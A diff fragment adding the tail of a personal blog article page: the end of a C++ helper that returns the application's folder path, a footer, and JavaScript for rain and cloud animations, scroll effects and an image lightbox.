+		}
+	}
+	return 0;
+}
+
+std::wstring kdmUtils::GetCurrentAppFolder() {
+	wchar_t buffer[1024];
+	GetModuleFileNameW(NULL, buffer, 1024);
+	std::wstring::size_type pos = std::wstring(buffer).find_last_of(L&quot;\\/&quot;);
+	return std::wstring(buffer).substr(0, pos);
+}</code></pre>
+
+
+</div>
+
+
+
+<div class="footer-nav" style="margin-top:40px;padding-top:24px;border-top:1px solid rgba(255,255,255,.07);">
+<a href="../index.html" style="color:#00d4ff;font-family:'JetBrains Mono',monospace;font-size:13px;">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2026 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
